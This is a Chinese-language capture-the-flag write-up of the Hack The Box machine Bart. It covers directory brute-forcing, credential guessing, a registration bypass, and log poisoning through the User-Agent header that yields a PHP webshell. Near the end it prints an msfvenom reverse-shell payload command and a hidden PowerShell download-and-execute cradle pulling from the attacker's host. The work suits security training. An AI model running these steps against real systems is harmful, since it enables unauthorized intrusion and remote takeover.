src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405135941707.png" alt="image-20220405135941707"  /><p>当然还有页脚信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405140013344.png" alt="image-20220405140013344"  /><p>我知道了它们的公司地址，它们的联系电话，它们的邮箱地址，还有它们的CMS为：<strong>WordPress</strong>，用的主题为Sydney by aThemes。</p><p>紧接着我想查看一下开发部这位漂亮员工有无在注释中为我透露些什么信息，这些信息通常都是以注释类型存在的，而我找到了另外一名不存在当前页面的员工，可能他不喜欢受到别人的关注：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405141427349.png" alt="image-20220405141427349"  /><p><strong>Wappadlzer</strong>又为我提供了一些详细信息，刚好对我收集到的信息得到一些补充：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405141641904.png" alt="image-20220405141641904"  /><p>接下来我尝试对目标的主域名bart.htb进行访问，但是很抱歉，我访问不到，它一直转圈，可能是由于端口未开放，目标可能真的为我只开放了一个80HTTP端口，我尝试对目标端口服务重新探测了一遍，它真的只有80端口开放：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405142233935.png" alt="image-20220405142233935"  /><p>好吧，我决定对目标子域名进行更深入的了解，我准备对其进行路径爆破，我指定了<strong>dirsearch</strong>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u http:<span class="hljs-regexp">//</span>forum.bart.htb/ -e php<br></code></pre></td></tr></table></figure><p>哇哦，不可思议，它没有为我枚举到什么：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405143047126.png" alt="image-20220405143047126"  /><p>我又尝试了gobuster：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://forum.bart.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <br></code></pre></td></tr></table></figure><p>它一样的没有帮我枚举到什么信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405160711474.png" alt="image-20220405160711474"  /><p>但是gobuster为我枚举出了一个服务器错误的页面信息，我点进去发现是如下页面，它的状态码为500：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405160846152.png" alt="image-20220405160846152"  /><p>我尝试在返回包中发掘一些信息，但是什么都没有回复给我，只是像平常一样的500错误返回包，但是我访问正常的<a href="http://forum.bart.htb/%E5%AE%83%E4%BE%9D%E6%97%A7%E6%98%AF%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E7%9A%84%E3%80%82%E4%BA%8E%E6%98%AF%E6%88%91%E6%80%80%E7%96%91%E7%9B%AE%E6%A0%87%E5%AD%98%E5%9C%A8%E7%9D%80%E4%BB%80%E4%B9%88%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BE%8B%E5%A6%82WAF%E6%8A%8A%E6%88%91%E7%9A%84%E8%AF%B7%E6%B1%82%E5%8C%85%E6%8B%A6%E6%88%AA%E6%8E%89%E4%BA%86%E3%80%82%E4%BD%86%E6%98%AF%E6%88%91%E9%80%9A%E8%BF%87%E8%BF%94%E5%9B%9E%E5%8C%85%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%97%A0%E6%B3%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8WAF%E3%80%82">http://forum.bart.htb/它依旧是可以访问的。于是我怀疑目标存在着什么防护机制例如WAF把我的请求包拦截掉了。但是我通过返回包中的信息无法判断目标是否存在WAF。</a></p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405161105961.png" alt="image-20220405161105961"  /><p>我尝试用wafw00f帮我枚举检测，可它也并没有检测到任何信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wafw00f http://forum.bart.htb<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405161505798.png" alt="image-20220405161505798"  /><p>我尝试了wordpress的默认配置目录，例如wp-content、wp-admin。它都返回给了我如下信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405162039365.png" alt="image-20220405162039365"  /><p>目前我得出了以下个结论：</p><ol><li>或许它真的没有任何目录，那我就需要回头梳理一下看我遗漏了什么，或Nmap重新扫描一下，看我能否再扫出些什么。</li><li>或许我提交的参数被防护拦截掉了，尽管我可能不知道它是什么拦截规则。</li><li>或许是因为服务器返回的错误信息欺骗了扫描器，致使目录扫描器认为服务端出现了错误便停止了扫描。</li></ol><p>Nmap为我重新枚举了一次目标端口服务，我重新浏览了一次目标80端口的Web页面，我并没有发现新的信息。当然不排除它漏扫误报以及我又忽略掉了某些信息的可能，但是我觉得它可以暂时排除掉了。</p><p>我又尝试在服务器500状态码返回包中的错误信息试着去查看目标有无WAF信息，同样的我没有获取到新的信息，因为各WAF防护机制响应内容是完全可以个人自定义的。即使我不甘心，但我也目前得把这项结论不能说是排除，算挂起吧。</p><p>那么该第三条结论，或许是在路径爆破扫描器检测到服务端返回500便停止了扫描。我想起了目标的主域名bart.htb。虽然它无法访问，但是我可以试着去探测爆破一下路径，它还真发现一个页面令我意外，它是个200OK的状态码：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405165354733.png" alt="image-20220405165354733"  /><p>而我试着去打开它，它页面是这样的，而同样的，返回包中也没有其他对我有用的信息，没有WAF特征信息：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405165526148.png" alt="image-20220405165526148"></p><p>同样的，扫描器也没为我探测到WAF：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405165636398.png" alt="image-20220405165636398"  /><p>我尝试对以IP为参数对其进行目录爆破,同样的，它也为我返回了200OK状态码的图片页面。至此我认为，WEB站点下边确实会存在某些目录，只是我通过扫描器提交了不存在的目录名被某种防护机制重定向到了该状态码为200OK的图片页面。因为它主域名bart.htb或是10.10.10.81返回给我的是200图片页面，而它的子域名forum.bart.htb返回给我的是一个500状态码包含服务器错误信息的页面。</p><p>所以我猜测，目标的web结构是以10.10.10.81，也就是bart.htb为根目录，当访问根目录下不存在的目录会跳转到200OK图片页面，而forum.bart.htb是它根目录下的某个目录，只是通过IIS服务将其解析到了子域名的默认根目录。那么我访问到的子域名forum.bart.htb，它的完整路径应该类似于：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://bart.htb/forum<br></code></pre></td></tr></table></figure><p>或是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://10.10.10.81/forum<br></code></pre></td></tr></table></figure><p>当然它也可能是forum.bart，forum.bart.htb，完全无所谓，我可以都试试，为了不影响我的结论，我需要把&#x2F;etc&#x2F;hosts中的信息更改一下，因为我先前填的是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.81 forum.bart.htb<br></code></pre></td></tr></table></figure><p>在bart.htb无法访问时我尝试去将其更改过，但是bart.htb依然无法正常访问，我始终在纠结bart.htb究竟存不存在。现在如果根据我刚刚的想法，它确实应该是存在的，我就需要将更改为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.81 bart.htb<br></code></pre></td></tr></table></figure><p>那么我验证自己的想法会很简单，我只需要尝试去访问如下目录，当然它也可能是其他的目录，但是我觉得这种情况应该很少或是不会出现，因为如果一个企业这么做了，那么如果它对应的岗位负责人更换了，新人面对这样的处境将会很麻烦从而出现工作交接困难的情况，企业是不会允许这种情况的，虽然它只是个靶场，但我觉得应该也会符合情理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://bart.htb/forum<br>http://bart.htb/forum.bart<br>http://bart.htb/forum.bart.htb<br></code></pre></td></tr></table></figure><p>我非常幸运，只尝试了第一个地址，它就成功的返回了我子域名forum.bart.htb的页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405173845895.png" alt="image-20220405173845895"  /><p>可现在有一种令我很头疼的事情，我如果在当前根目录进行爆破的话，它就会将我重定向到200OK的图片页面，而且现在看来，它或许一个目录对应一个子域名，如果是在外部的网络环境，我可以通过查询DNS解析记录IP反查域名来寻找它的旁站，可是HTB的靶场是通过它特定的VPN进行连接的，我与目标机器处于同一个内网环境中，没有DNS解析记录供我查询。那么我就只能盲猜，还是毫无根据的盲猜。</p><p>当然我是不愿意的，毫无根据的做事在我看来便是吃力不讨好，我想着能否把200状态码给过滤掉，因为200状态码便是那个图片页面，让扫描器屏蔽到所有的200状态码，但是如果我请求到正确的目录呢？这时我想到如果我通过url地址请求到正确的目录，那么解析服务组件会在我请求的目录下寻找默认的index.html或是php等默认的首页返回给我，这又何尝不算是一种重定向呢，既然重定向那它的状态码应为3xx，为了验证我的想法，我又尝试访问<a href="http://bart.htb/forum%EF%BC%8C%E6%88%91%E7%9A%84%E7%8C%9C%E6%B5%8B%E6%98%AF%E9%94%99%E8%AF%AF%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E5%BE%88%E9%AB%98%E5%85%B4%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%88%91%E7%9A%84%E7%8C%9C%E6%B5%8B%E4%B9%9F%E5%AF%B9%E4%BA%86%EF%BC%9A">http://bart.htb/forum，我的猜测是错误的，但是我很高兴，因为我的猜测也对了：</a></p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405180253698.png" alt="image-20220405180253698"  /><p>它确实不是3xx的重定向状态码，但是它是206状态码，虽然我无法确定其他目录的状态是什么，但是它应该不会是200，我或许真的可以过滤掉所有的200状态码对目标路径再进行一次爆破，而且很幸运，Gobuster有这一项功能，但是不知为何我过滤失败了。</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405194403635.png" alt="image-20220405194403635"  /><p>幸运的是我发现了另一款工具，Kalinux自带wfuzz，-hh参数是表示过滤掉返回信息中包含指定内容的消息，例如该环境中，如果我不使用-hh参数的话，它会返回一堆不存在的目录状态码为200：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wfuzz -c -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster<span class="hljs-regexp">/directory-list-2.3-medium.txt http:/</span><span class="hljs-regexp">/bart.htb/</span>FUZZ<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405210655782.png" alt="image-20220405210655782"  /><p>当然它们还是指向的那个错误图片页面，如果我想过滤掉返回信息为那个错误图片的页面，又不想因为200状态码过滤掉其他我不希望的文件或目录，我就可以选择如上图的630或是5628或是150693用-hh参数添加为我希望过滤掉的条件，它就会为我过滤掉符合条件的信息目录，然后把其他的条件为我显示打印出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 150693 http://bart.htb/FUZZ <br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405211149549.png" alt="image-20220405211149549"  /><p>它很慢很慢，因为有22万的字典参数，还有受网络延迟影响的效率，我等了有十几分钟，它为我列出了一个新的目录：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405213702686.png" alt="image-20220405213702686"  /><p>但是我并不准备挂掉它，我希望它能为我枚举到更多的信息，而且如果我这时候对目标monitor进行访问，又会慢很多很多，所以我决定再等它一会儿，然而我又等了十几分钟，它为我枚举到的还是monitor，我不得不先挂掉它，我先访问monitor试试，如果我又一筹莫展，我会考虑再请求它帮我枚举一次，于是我访问了monitor目录，确切的说它是一个子域名：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405214446477.png" alt="image-20220405214446477"  /><p>我访问到了，它是一个登录框，而它的目录名翻译中文是监测的意思，我觉得它像是一个管理型后台登录页面。而左下角显示了它的版本信息，我准备先对其进行公开漏洞搜索：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405214725656.png" alt="image-20220405214725656"  /><p>好吧，它什么也没有，于是我觉得去搜寻一下PHP Server Monitor v3.2.1，当你我希望知道某个组件的具体信息，最有用最直接最省力的便是去它的官方看帮助文档，该环境很贴心的为我准备了它官网的超链接，但我点进去发现一个有意思的事情，它的版本号为3.2.1，而我在它官网文档查看时，对了，这是它的官网链接：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//www.phpservermonitor<span class="hljs-meta">.org</span>/<br></code></pre></td></tr></table></figure><p>我一度以为是我还处于内网环境中，但我觉得不对劲，我用我没走VPN的宿主机访问了一次，该组件只发布到了3.2.0，最重要的是我的目标机器发布到HTB好久了：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405215211649.png" alt="image-20220405215211649"  /><p>似乎出现了某种超前的现象，我觉得是人为进行混淆更改的，它想混淆我的视听，但是这并不能影响我很多，从PHP Server Monitor官网可获取到很多信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405215711165.png" alt="image-20220405215711165"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405215734881.png" alt="image-20220405215734881"  /><p>我简单概括一下，该组件可用于管理服务器上运行的服务，站点项目，还有一个cronjob看起来像是计划任务，而目标操作系统是windows，windows上运行的服务通常是以高权限运行的，如果能够通过PHP Server Monitor进行管理，那PHP Server Monitor也应是具有高权限的，因为它要对系统服务进行操控。</p><p>或是它每次操作系统内部服务，系统内部会对其进行身份认证校验，好比某些工具调用其他第三方API需要在配置文件中有对应的账户口令或是key，而对应的账户一定是具有管理员级别权限的。</p><p>那么我的思路会很明确，进入该后台并查看某些与系统交互的地方，或是它的配置文件中保存的口令，当然有个前提，我需要进入。我先尝试了普通的弱口令，都回复了我信息不正确的错误 信息。我尝试使用我在forum.bart.htb收集到的用户名，可惜它都返回给了我同样的信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405221651760.png" alt="image-20220405221651760"  /><p>在当前页面我无法枚举用户名，当然我可以尝试注入漏洞，但是我觉得可以先到Forgot Password去看一眼，因为找回密码通常会使用邮箱信息，而我有在forum.bart.htb子域名收集到一些，比起注入显得更有优势，我点进去发现它要求我输入用户名：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405222003560.png" alt="image-20220405222003560"  /><p>而我在尝试输入用户名后，它会提示无法检测到用户名：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405222141984.png" alt="image-20220405222141984"  /><p>我猜测它像是我输入的用户名不存在的意思，所以我又尝试了其他的人的姓例如simmons 、hilton、doe、potter，当然还有它们的名，国外名在前，姓在后，samantha daniel robert jane，当然还有在注释中发现的harvey，当我使用harvey后它提示我向harvey邮箱发送了一封电子邮件：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405222828366.png" alt="image-20220405222828366"  /><p>我准备用Burpsuite进行爆破，因为在我对目标检测时，Burpsuite抓到了一些其他东西：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405223437709.png" alt="image-20220405223437709"  /><p>我尝试把收集到的用户名进行不同的组合，添加到了弱口令字典中，也幸好我将其添加进了字典中，因为它最后跑出来的结果：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405223757401.png" alt="image-20220405223757401"  /><p>我拿到了一组可用来登录的用户名,我成功登录了进去：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">harvey:</span>potter<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405224322773.png" alt="image-20220405224322773"  /><p>它的Update我点不了，help会跳转到PHP server monitor官方，而status或servers与log都是一样的页面，并没有能与目标机器系统交互的地方，不过它确实提供给我一个重要的信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405224835686.png" alt="image-20220405224835686"  /><p>我又获取到了一个新域名，在目标80端口上。于是我又不得不更改&#x2F;etc&#x2F;hosts，将以下域名记录：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">internal</span><span class="hljs-number">-01.</span>bart.htb<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405225429409.png" alt="image-20220405225429409"  /><p>它又是一个登录框，而我刚刚获取到的密码在这里是不起作用的。我先对其进行了简单的SQL注入验证，它并没有反馈给我更多的信息，如出一辙的：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405225813330.png" alt="image-20220405225813330"  /><p>我尝试查看源代码，它的注释中同样也没有什么信息，但是在我审查元素时候，我发现了一个有意思的事情：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406002756062.png" alt="image-20220406002756062"  /><p>当前页面为login_form.php，也就是登录表单，它提交到后端的代码文件为login.php，好像它将数据参数提交到了另一个脚本文件中，我尝试直接对login.php进行访问，当然这是妄想，我访问不到，它会把我重定向回来。</p><p>我尝试对它根目录进行访问，但是它还会将我重定向回该登录页面，于是我准备对目标根目录进行路径爆破：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405230215042.png" alt="image-20220405230215042"  /><p>它帮我发现了一个log.txt，我尝试对其进行访问：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405230334272.png" alt="image-20220405230334272"  /><p>我尝试对dirsearch为我枚举到的目录都访问一遍，但是它都返回给了我这样的错误信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405230727090.png" alt="image-20220405230727090"  /><p>于是我又尝试对目标当前登录页面进行了目录爆破：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406000242744.png" alt="image-20220406000242744"  /><p>我枚举到了一个register_form.php，它看起来像是一个注册页面，但是我无法访问它，一样的，我尝试根据刚才的发现访问register.php，它也是一直在加载中：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406001152492.png" alt="image-20220406001152492"  />Dirsearch倒是提醒了我，我在以Get方式发送请求爆破路径，或许我可以试试用Post。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -m post -u http:<span class="hljs-regexp">//i</span>nternal-<span class="hljs-number">01</span>.bart.htb<span class="hljs-regexp">/simple_chat/</span><br></code></pre></td></tr></table></figure><p>可惜结果是一样的：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406000818333.png" alt="image-20220406000818333"  /><p>或许我应该用POST方式去请求页面试一试，我选择用Burpsuite，我以POST进行访问，即使我什么参数都没提交它也应该返回给我个请输入参数或是参数为空的错误提示信息，然而目标什么都没有回我：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406001349575.png" alt="image-20220406001349575"  /><p>或许是我需要添加个来源访问，通常注册按钮都在登录页面，可能它会校验来源例如Referer字段，可它还是没有理我：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406001710829.png" alt="image-20220406001710829"  /><p>又或许是GET请求添加来源？可惜我还是失败了。在我准备拼运气爆破抓包的时候，我产生一个念头，或许我可以将login_from.php的数据包拦截抓取将其重定向提交到register_from.php或是register.php，那么我会不会不需要爆破正确的用户，而变成注册了一个合法的用户。我尝试将login.php替换为register.php：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406004627992.png" alt="image-20220406004627992"  /><p>它竟然回应我了，它返回了302重定向，我想我添加的账号或许成功了。在我放完包关闭拦截请求的那一刻，页面跳转到了聊天软件页面，我成功了，我登录进去了：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406004816336.png" alt="image-20220406004816336"  /><p>我高兴的试着跟它们聊天，然而它们不理我：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005000725.png" alt="image-20220406005000725"  /><p>当前页面一个有一个刷新按钮，没什么用，一个Logout退出，不可能的，我好不容易才进来。那就只剩一个log按钮了，我尝试点击它，它回应了我一个弹窗：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005214373.png" alt="image-20220406005214373"  /><p>哦，是两个弹窗：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005230236.png" alt="image-20220406005230236"  /><p>然而源代码中它并没有什么信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005452894.png" alt="image-20220406005452894"  /><p>我尝试拦截数据包，并提交了一份，它返回给我的信息是这样的：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005709339.png" alt="image-20220406005709339"  /><p>我不能改变参数，只要我在参数中添加或删除任何字符，服务器都会响应给我一个错误信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005915447.png" alt="image-20220406005915447"  /><p>我觉得它像是一个我多目标服务器发起了某种请求，而它返回给我一个弹窗例如成功 or 失败，我觉得它像是一个保存聊天记录的功能，但是它并不是保存在我本地，因为我本地并没有收到类似于下载或是另存为的请求弹窗，我觉得它是记录在目标机器中，如果它记录在目标机器中，那么它就需要调用类似于open()打开某个文件并写入write()等功能，对了，我前边是爆破出它的日志记录的&#x2F;log&#x2F;log.txt，但是我再去访问时，它的信息还是这样：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406010714217.png" alt="image-20220406010714217"  /><p>而它的记录是浏览器头，或许是浏览器头有什么我们可用的地方？但是当我又点击聊天页面的log按钮时，Burpsuite为我拦截到了这个数据包：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406010845604.png" alt="image-20220406010845604"  /><p>我当前用户不是harvey，但它提交的username参数值为harvey，我尝试更改为我当前用户worldisend，它第二个弹窗变成了0：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011033910.png" alt="image-20220406011033910"  /><p>在该过程中还会有一个奇怪的数据包：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011200783.png" alt="image-20220406011200783"  /><p>哦，是我请求太快了，不好意思。我尝试直接访问log&#x2F;log.php，说不定它解析错误我可以直接读到它的php代码，当然我是在妄想：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011557682.png" alt="image-20220406011557682"  /><p>我好像获取到了目标的绝对路径，但是我再去访问log.txt，它还是什么都没有：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011747275.png" alt="image-20220406011747275"  /><p>或许我不应该替换harvery，而是把浏览器头给替换一下，我尝试更改浏览器头：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011927514.png" alt="image-20220406011927514"  /><p>我还是失败了。它还是那样，或许我可以更改一下文件名？</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120306425.png" alt="image-20220406120306425"  /><p>它好像是成功了，并且第二个弹窗中的值为1：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120403506.png" alt="image-20220406120403506"  /><p>看起来它会接收用户数据包中的参数，例如户以及浏览器请求头然后将其写入到filename指定的文件中去，不如我再试一次：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120718898.png" alt="image-20220406120718898"  /><p>它返回了0：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120741967.png" alt="image-20220406120741967"  /><p>很抱歉，不行：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120824556.png" alt="image-20220406120824556"  /><p>梳理一下思路，首先文件名我是更改过的为hello.txt的，它貌似是可以正常访问，当然不排除目标可能有这个文件只是我路径爆破没爆破出来。那问题应该出现在用户名或是浏览器头上。而且貌似需要它的第二个弹窗为1，0表示失败，1代表成功。我尝试只更改用户名与文件名：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121400656.png" alt="image-20220406121400656"  /><p>它返回了0，而我访问不到文件：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121452796.png" alt="image-20220406121452796"  /><p>它的用户名好像是写死的，只能使用harvey，我尝试更改文件名与浏览器头：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121703977.png" alt="image-20220406121703977"  /><p>它返回了1：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121725016.png" alt="image-20220406121725016"  /><p>我成功了:</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121754837.png" alt="image-20220406121754837"  /><p>看来该系统会记录用户的浏览器头，并以日志的形式存储到某个文件，并且他有以下特征：</p><ol><li>文件名是我可以拦截数据包控制的。</li><li>用户名无法更改，必须是harvey。</li><li>它记录的是用户的浏览器请求头字段。</li></ol><p>或许我可以尝试将txt文件后缀改为PHP：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406122250137.png" alt="image-20220406122250137"  /><p>哦它返回了1，我试着去访问我写入的phpinfo，YES！：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406122512441.png" alt="image-20220406122512441"  /><p>我获取很多很多目标的信息：</p><p>目标系统为windows10、32位系统、并且它没有对PHP敏感函数做任何限制，意味着我可以使用命令函数实现远程RCE：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406123441403.png" alt="image-20220406123441403"  /><p>构造payload数据包：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406125706194.png" alt="image-20220406125706194"  /><p>我成功了：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406125904078.png" alt="image-20220406125904078"  /><p>我可以本地Metasploit生成powershell载荷：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=1121 -f psh-reflection &gt;/home/worldisend/x.ps1<br></code></pre></td></tr></table></figure><p>然后启动一个http服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>Matesploit启动对应的监听模块，然后将以下命令复制到webshell页面进行cmd参数提交，当然我试过直接将以下命令写入到payload数据包中的浏览器头字段中的<?php system()?>中，但它因为某种不知名原因失败了，所以还是老老实实一步一步走吧，别老是想着走捷径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -nop -w hidden -c <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.16.5:80/x.ps1&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406132952924.png" alt="image-20220406132952924"  /><p>如果执行成功会像我下图右边，会有目标GET请求下载x.ps1的200状态码提示信息，我成功获取到了Meterpreter会话：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406132914839.png" alt="image-20220406132914839"  /><p>然后发生了点意外，我手快运行getsystem直接获取到目标系统权限级别的Meterpreter：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406133430618.png" alt="image-20220406133430618"  /><p>root.txt标志在这里：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406135901838.png" alt="image-20220406135901838"  /><p>user.txt在这里：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406140027502.png" alt="image-20220406140027502"  />]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
